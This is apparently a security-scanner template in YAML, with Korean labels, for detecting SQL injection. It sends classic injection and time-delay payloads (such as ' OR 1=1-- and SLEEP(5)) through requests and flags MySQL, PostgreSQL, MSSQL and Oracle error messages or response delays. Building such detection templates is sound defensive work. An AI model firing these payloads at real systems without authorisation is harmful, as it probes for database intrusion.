id: sqli-base
info:
  name: 'SQL Injection 통합 스캔'
  severity: 'critical'
  description: 'DB 에러 메시지 및 시간 지연을 이용한 SQLi 탐지'

definition:
  method: ['GET', 'POST', 'PUT']
  position: ['query', 'body', 'form_field', 'cookie']

payloads:
  - "' OR 1=1--"
  - "' OR '1'='1"
  - "\" OR 1=1--"
  - "1; SELECT SLEEP(5)--"
  - "1' AND SLEEP(5)--"
  - "'; WAITFOR DELAY '0:0:5'--"

matchers-condition: or

matchers:
  # MySQL / MariaDB 에러
  - type: word
    words:
      - 'You have an error in your SQL syntax'
      - 'mysql_fetch_array()'
      - 'mysql_num_rows()'
      - 'Warning: mysql_'
      - 'mysql_connect()'
  # PostgreSQL 에러
  - type: word
    words:
      - 'PostgreSQL query failed'
      - 'pg_query() ['
      - 'unterminated quoted string at or near'
  # MSSQL 에러
  - type: word
    words:
      - 'Microsoft OLE DB Provider for SQL Server'
      - 'Unclosed quotation mark after the character string'
      - 'ODBC SQL Server Driver'
  # Oracle 에러
  - type: word
    words:
      - 'ORA-01756'
      - 'ORA-00933'
      - 'quoted string not properly terminated'
  # 시간 지연 탐지 (SLEEP/WAITFOR 페이로드 대응)
  - type: time
    delay: 5
